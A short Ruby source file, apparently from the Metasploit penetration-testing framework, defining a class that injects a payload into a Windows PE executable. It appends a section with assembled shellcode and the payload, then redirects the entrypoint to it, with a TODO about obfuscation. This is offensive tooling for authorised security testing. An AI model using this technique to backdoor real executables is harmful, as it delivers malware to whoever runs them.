# -*- coding: binary -*-
# frozen_string_literal: true

module Msf
  module Exe
    # Appends a payload section and redirects the PE entrypoint to it.
    class SegmentHijacker < SegmentAppender
      def generate_pe
        pe_orig = Metasm::PE.decode_file(template)
        pe = copy_pe(pe_orig)

        append_section(pe)

        pe.optheader.entrypoint = 'new_entrypoint'
        pe.cpu = pe_orig.cpu

        pe.encode_string
      end

      private

      def build_section_data(prefix:)
        # TODO: Implement possibly helpful payload obfuscation
        asm = "new_entrypoint:\n#{prefix}\n"
        shellcode = Metasm::Shellcode.assemble(processor, asm)
        shellcode.encoded + payload
      end
    end
  end
end
